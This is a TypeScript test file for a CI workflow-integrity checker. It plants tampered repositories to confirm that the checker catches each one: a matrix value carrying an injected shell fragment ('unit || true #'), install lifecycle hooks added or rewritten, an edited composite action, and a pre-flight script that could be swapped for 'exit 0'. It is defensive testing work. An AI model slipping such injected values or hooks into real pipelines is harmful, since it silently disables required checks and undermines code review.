describe("a declared input that goes missing is reported, not iterated as empty", () => {
  // An adversarial audit of this file found four of these at once, and they share one shape: a
  // property whose input is absent evaluates nothing and reports PASS. Every other declared
  // input in this context already refused that; these did not, and they are the ones that pin
  // what the skippable lanes do and what they are skipped on.

  for (const [label, edit, pattern] of [
    [
      "gateOutputs deleted outright",
      (decl: Declaration) => {
        delete onlyContext(decl).gateOutputs;
      },
      /no .?gateOutputs.? mapping/,
    ],
    [
      "gateOutputs emptied",
      (decl: Declaration) => {
        onlyContext(decl).gateOutputs = {};
      },
      /no .?gateOutputs.? mapping/,
    ],
    [
      "gatedVerifications deleted outright",
      (decl: Declaration) => {
        delete onlyContext(decl).gatedVerifications;
      },
      /no .?gatedVerifications.? mapping/,
    ],
    [
      "gatedVerifications emptied",
      (decl: Declaration) => {
        onlyContext(decl).gatedVerifications = {};
      },
      /no .?gatedVerifications.? mapping/,
    ],
  ] as const) {
    it(`reports ${label}`, () => {
      const dir = plantedTree((d) => {
        editDeclaration(d, (decl) => {
          edit(decl);
          return decl;
        });
      });
      try {
        const run = runLane(dir);
        expect.soft(run.exitCode, `${label} must exit 1:\n${run.output}`).toBe(1);
        expect.soft(run.output).toMatch(pattern);
      } finally {
        rmSync(dir, { recursive: true, force: true });
      }
    });
  }

  it("reports a gated key deleted while its digest stays behind", () => {
    // The precise attack the audit measured: drop one line from `gatedVerifications` and that
    // lane's body is pinned by nothing, while the digest it left behind in `verificationBodies`
    // makes the diff still look pinned. A digest nothing consults is worse than no digest.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        const [item] = Object.keys(context.gatedVerifications ?? {});
        if (item === undefined) throw new Error("the declaration pins no gated verification");
        delete context.gatedVerifications?.[item];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an orphaned digest must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/in neither verificationSet nor gatedVerifications/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a gate output pinned as something that is not a mapping", () => {
    // `{"detect": null}` leaves the job NAMED in the file, so a reviewer grepping it still sees
    // the entry — and the property silently skipped it.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        const [name] = Object.keys(context.gateOutputs ?? {});
        if (name === undefined) throw new Error("the declaration pins no gate outputs");
        // A shape the type cannot express, which is the point: the LANE must refuse it.
        (context.gateOutputs as Record<string, unknown>)[name] = null;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `an unreadable gate-output mapping must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toMatch(/cannot read as a mapping/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the pre-flight stands where the attack passes", () => {
  // The audit found the order check was internally consistent and nothing more: the declaration
  // could be repointed at any job whose first step satisfies the rule — the aggregate itself,
  // say — while the real refusal moved behind the composite action it exists to precede.

  it("reports a pre-flight stationed in a job the aggregate does not depend on", () => {
    // The planted job EXISTS, declares the step, and invokes a local action — so every other
    // property about the pre-flight is satisfied and only the dependency one can fail.
    //
    // Measured, because the first version did not do this: repointing at a job name that does not
    // exist also produces `declares no step named`, and the row passed on that instead. A plant
    // has to leave exactly one thing wrong.
    const dir = plantedTree((d) => {
      const step = firstContext(d).preflight?.step;
      if (step === undefined) throw new Error("the declaration pins no pre-flight step");
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "  lint:" + "\n";
        if (!text.includes(anchor)) throw new Error("the lint job anchor is stale");
        const planted = [
          "  preflight-elsewhere:",
          "    permissions: {}",
          "    runs-on: ubuntu-latest",
          "    timeout-minutes: 5",
          "    steps:",
          `      - name: ${step}`,
          "        run: bash ./scripts/check-toolchain-action.sh",
          "        shell: bash",
          "      - uses: ./.github/actions/setup",
          "",
        ].join("\n");
        return text.replace(anchor, planted + anchor);
      });
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        if (context.preflight === undefined) throw new Error("no preflight to repoint");
        context.preflight.job = "preflight-elsewhere";
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a refusal outside the aggregate must exit 1:\n${run.output}`)
        .toBe(1);
      expect
        .soft(run.output, "the finding must be the dependency one, not a missing step")
        .toMatch(/does not depend on/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a pre-flight stationed in a job that invokes no local action", () => {
    // A refusal has to stand in front of the thing it refuses. `ci-pass` depends on everything
    // and invokes no composite action, so repointing there passes the order rule trivially — the
    // step is first because nothing else in that job does any work.
    const dir = plantedTree((d) => {
      const step = firstContext(d).preflight?.step;
      if (step === undefined) throw new Error("the declaration pins no pre-flight step");
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "  ci-pass:" + "\n";
        if (!text.includes(anchor)) throw new Error("the aggregate anchor is stale");
        return text.replace(
          anchor,
          anchor + "    # planted: the refusal, moved somewhere it refuses nothing\n",
        );
      });
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        if (context.preflight === undefined) throw new Error("no preflight to repoint");
        context.preflight.job = "ci-pass";
        context.preflight.step = "Derive the verdict from the serialized needs map";
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a refusal in front of nothing must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toMatch(/invokes no local composite action/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the values a gated lane expands over are pinned too", () => {
  // Review finding [97]. `Run tests (${{ matrix.slice }})` is digested with the EXPRESSION in
  // it, so the digest says nothing about what it expands to — and every value reaches a shell.
  // `matrix-fail-fast` looks only at `fail-fast`, and nothing else looked at the values at all.

  it("reports a matrix value rewritten into shell the digest cannot see", () => {
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "        slice: [core, validators, integration, e2e, cli, unit, scripts]";
        if (!text.includes(anchor)) throw new Error("the matrix anchor is stale");
        return text.replace(
          anchor,
          '        slice: [core, validators, integration, e2e, cli, "unit || true #", scripts]',
        );
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a rewritten matrix value must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/expands its matrix axis/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a slice dropped from the list", () => {
    // The quieter half: no value is rewritten, a whole slice simply stops running.
    const dir = plantedTree((d) => {
      editWorkflow(d, firstContext(d).workflow, (text) => {
        const anchor = "        slice: [core, validators, integration, e2e, cli, unit, scripts]";
        if (!text.includes(anchor)) throw new Error("the matrix anchor is stale");
        return text.replace(
          anchor,
          "        slice: [core, validators, integration, e2e, cli, unit]",
        );
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a dropped slice must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/expands its matrix axis/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a declaration that pins no matrix at all", () => {
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        delete onlyContext(decl).dependencyMatrices;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned matrix must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/no .?dependencyMatrices.? mapping/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("checks the values against the declaration rather than against nothing", () => {
    // Editing the DECLARATION must make the same tree fail, or the passing tree is satisfied by
    // a lane that never compares.
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        const context = onlyContext(decl);
        const matrices = context.dependencyMatrices;
        if (matrices === undefined) throw new Error("no matrix to edit");
        const [job] = Object.keys(matrices);
        if (job === undefined) throw new Error("no matrix job to edit");
        const axes = matrices[job];
        if (axes === undefined) throw new Error("no axes to edit");
        const [axis] = Object.keys(axes);
        if (axis === undefined) throw new Error("no axis to edit");
        axes[axis] = [...(axes[axis] ?? []), "a-slice-the-workflow-does-not-run"];
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(
          run.exitCode,
          `a declaration naming a slice the tree does not run must exit 1:\n${run.output}`,
        )
        .toBe(1);
      expect.soft(run.output).toMatch(/expands its matrix axis/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("a local action arrives with its digest or not at all", () => {
  // Review finding [95]. The pre-flight refused a command-file NAME and nothing else, so a step
  // added to the toolchain action could `printf 'process.exit(0)' > <the hygiene lane>` and
  // replace this program before it ran — or rewrite any verification source, in every job that
  // uses the action. Enumerating what a step may DO is the losing side of that argument; what
  // the action IS can be pinned.

  it("reports a local action whose bytes moved", () => {
    const dir = plantedTree((d) => {
      const action = path.join(d, ".github", "actions", "setup", "action.yml");
      writeFileSync(action, `${readFileSync(action, "utf-8")}# planted\n`, "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an edited local action must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/hashes to [0-9a-f]{64} where/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports a file added to the actions tree that nothing pins", () => {
    // The other direction: no pinned file changed, a new one simply appeared. A composite action
    // reads whatever sits beside it, so an unpinned file there is code nobody reviewed.
    const dir = plantedTree((d) => {
      const planted = path.join(d, ".github", "actions", "planted");
      mkdirSync(planted, { recursive: true });
      writeFileSync(path.join(planted, "action.yml"), "name: planted\n", "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned action file must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/pinned by nothing/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports the pre-flight's list disagreeing with the declaration", () => {
    // Two readers, one fact. The pre-flight reads the data file on the runner and this lane reads
    // the declaration; a refusal that checks a different list from the one it was handed is no
    // refusal at all.
    const dir = plantedTree((d) => {
      const list = path.join(d, ".github", "local-action-digests.txt");
      const before = readFileSync(list, "utf-8");
      writeFileSync(list, before.replace(/^[0-9a-f]{64}/m, "0".repeat(64)), "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a disagreeing list must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/where .* declares/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a declaration that pins no local action at all", () => {
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        delete onlyContext(decl).localActionDigests;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned action set must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/no .?localActionDigests.? mapping/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports the list going missing, which the pre-flight reads before anything runs", () => {
    const dir = plantedTree((d) => {
      rmSync(path.join(d, ".github", "local-action-digests.txt"), { force: true });
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a missing list must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/is missing or not a readable regular file/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the pre-flight checks its own bytes before it checks anything else", () => {
  // Review finding [101]. Everything this step runs comes out of the pull request's checkout,
  // so a pull request could rewrite `check-toolchain-action.sh` to `exit 0` and then poison the
  // composite action freely — the digest agreement between the action list and the declaration
  // is verified by the hygiene lane, and that lane runs AFTER the action it was protecting.
  //
  // Nothing in a repository makes its own checkout trustworthy: on a `pull_request` event GitHub
  // runs the workflow from the pull request's tree. What the self-check buys is that weakening
  // the refusal takes SEPARATE, VISIBLE edits — the script, the digest in the workflow, and this
  // step's pinned body — instead of one line in a shell script nobody re-reads.

  it("carries the script's digest in the step, and the digest is the script's", () => {
    const workflow = readFileSync(path.join(REPO_ROOT, ".github", "workflows", "ci.yml"), "utf-8");
    const step = firstContext(REPO_ROOT).preflight?.step;
    if (step === undefined) throw new Error("the declaration pins no pre-flight step");
    const at = workflow.indexOf(`- name: ${step}`);
    expect(at, "the pre-flight step must exist in the workflow").toBeGreaterThan(-1);
    const body = workflow.slice(at, workflow.indexOf(`\n      - `, at + 1));

    const pinned = /([0-9a-f]{64}) {2}scripts\/check-toolchain-action\.sh/.exec(body)?.[1];
    expect(
      pinned,
      "the step must pin the refusal's own bytes, or the refusal can be replaced with `exit 0`",
    ).toBeDefined();
    expect(body, "and check them before running it, or the pin is a comment").toMatch(
      /sha256sum -c --quiet[\s\S]*?bash \.\/scripts\/check-toolchain-action\.sh/,
    );

    const actual = createHash("sha256")
      .update(readFileSync(path.join(REPO_ROOT, "scripts", "check-toolchain-action.sh")))
      .digest("hex");
    expect(
      pinned,
      "the pinned digest must be the script that ships — a stale one refuses every run, and a wrong one refuses nothing",
    ).toBe(actual);
  });
});

describe("what runs beside and before a verification is pinned too", () => {
  // Two ways to run code in a required lane without touching a pinned body. `pnpm run x` runs
  // `prex` and `postx` around it, and `pnpm install` runs the manifest's install lifecycle in
  // EVERY job before every verification in that job. Neither was reachable from the resolution
  // that follows a step's `run:` into its package script.

  it("reports a pre-script added beside a script a verification invokes", () => {
    // Review finding [104]. `preci:lint` runs before `ci:lint` and the digest never saw it.
    const dir = plantedTree((d) => {
      const manifest = path.join(d, "package.json");
      const parsed: unknown = JSON.parse(readFileSync(manifest, "utf-8"));
      if (!isRecord(parsed) || !isRecord(parsed["scripts"])) {
        throw new Error("the planted manifest carries no scripts map");
      }
      parsed["scripts"]["preci:lint"] = 'node -e "process.exit(0)"';
      writeFileSync(manifest, `${JSON.stringify(parsed, null, 2)}\n`, "utf-8");
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `a new pre-script must move a pinned digest:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toMatch(/body digest/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports an install lifecycle script the declaration does not pin", () => {
    // Review finding [105]. `pnpm install` runs it inside the composite action, in every job,
    // before every verification — and no body digest reaches it, because the package manager
    // invokes it rather than a step.
    const dir = plantedTree((d) => {
      const manifest = path.join(d, "package.json");
      const parsed: unknown = JSON.parse(readFileSync(manifest, "utf-8"));
      if (!isRecord(parsed) || !isRecord(parsed["scripts"])) {
        throw new Error("the planted manifest carries no scripts map");
      }
      parsed["scripts"]["postinstall"] = 'node -e "process.exit(0)"';
      writeFileSync(manifest, `${JSON.stringify(parsed, null, 2)}\n`, "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `an unpinned install hook must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares postinstall as/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("reports the declared preinstall being changed under it", () => {
    // The other direction: the hook stays, its command changes. This repository declares a
    // `preinstall`, so the hole was occupied rather than theoretical.
    const dir = plantedTree((d) => {
      const manifest = path.join(d, "package.json");
      const parsed: unknown = JSON.parse(readFileSync(manifest, "utf-8"));
      if (!isRecord(parsed) || !isRecord(parsed["scripts"])) {
        throw new Error("the planted manifest carries no scripts map");
      }
      parsed["scripts"]["preinstall"] = 'node -e "process.exit(0)"';
      writeFileSync(manifest, `${JSON.stringify(parsed, null, 2)}\n`, "utf-8");
    });
    try {
      const run = runLane(dir);
      expect.soft(run.exitCode, `a rewritten install hook must exit 1:\n${run.output}`).toBe(1);
      expect.soft(run.output).toMatch(/declares preinstall as/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it("refuses a declaration that pins no install lifecycle at all", () => {
    const dir = plantedTree((d) => {
      editDeclaration(d, (decl) => {
        delete onlyContext(decl).installLifecycle;
        return decl;
      });
    });
    try {
      const run = runLane(dir);
      expect
        .soft(run.exitCode, `an unpinned install lifecycle must exit 1:\n${run.output}`)
        .toBe(1);
      expect.soft(run.output).toMatch(/no .?installLifecycle.? mapping/);
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
